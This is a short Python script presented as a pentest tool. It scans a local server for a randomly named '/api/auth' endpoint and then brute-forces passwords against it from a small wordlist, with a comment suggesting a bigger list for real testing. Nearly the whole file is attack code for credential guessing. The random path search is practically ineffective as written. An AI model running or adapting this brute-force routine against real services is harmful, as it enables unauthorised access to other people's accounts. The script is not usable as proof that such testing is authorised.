
# pentest_tool.py
import requests
import string
import random
import time

BASE_URL = "http://127.0.0.1:5000"
LETTERS = string.ascii_lowercase

# Safe example wordlist (replace with bigger one for real testing)
WORDLIST = ["123456", "password", "letmein", "hunter2", "admin2025"]

def generate_paths(length=8, tries=1000):
    """Generate random possible API paths."""
    for _ in range(tries):
        yield "/" + "".join(random.choices(LETTERS, k=length)) + "/api/auth"

def find_api():
    """Find the hidden API endpoint."""
    print("[*] Scanning for API endpoint...")
    for path in generate_paths():
        url = BASE_URL + path
        try:
            r = requests.post(url, json={"password": "test"})
            if r.status_code in [200, 401]:
                print(f"[+] Found API endpoint: {url}")
                return url
        except requests.exceptions.RequestException:
            pass
    print("[-] API not found")
    return None

def brute_force(api_url):
    """Brute force passwords against the found API."""
    print("[*] Starting brute force attack...")
    for pwd in WORDLIST:
        r = requests.post(api_url, json={"password": pwd})
        if r.status_code == 200:
            print(f"[✅] Correct password found: {pwd}")
            return
        else:
            print(f"[❌] Wrong password: {pwd}")
        time.sleep(0.2)  # Slow down to simulate real-world delays
    print("[-] Password not found in list")

if __name__ == "__main__":
    endpoint = find_api()
    if endpoint:
        brute_force(endpoint)